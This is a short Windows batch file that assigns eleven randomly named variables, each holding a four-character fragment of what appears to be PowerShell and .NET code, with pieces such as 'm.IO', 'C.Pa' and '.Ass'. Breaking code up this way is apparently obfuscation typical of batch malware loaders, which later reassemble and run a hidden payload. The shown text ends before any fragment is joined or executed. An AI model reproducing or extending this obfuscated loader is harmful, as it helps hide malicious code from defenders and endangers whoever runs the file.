@echo off
set "wELSnlnlmt=$pNW"
set "KTmtMLRQXS=Vv ="
set "odbTIJUwPK=esMa"
set "vgmjtoheOG=pose"
set "HTKtMKQPhn='[-1"
set "QxAwtXKoKy=Star"
set "dpqGPHGNrm=C.Pa"
set "WzIjyOKNiQ=m.IO"
set "anXaaeoqWG=th('"
set "KmrDcYbiwi=B = "
set "rcDgtNeOuO=.Ass"
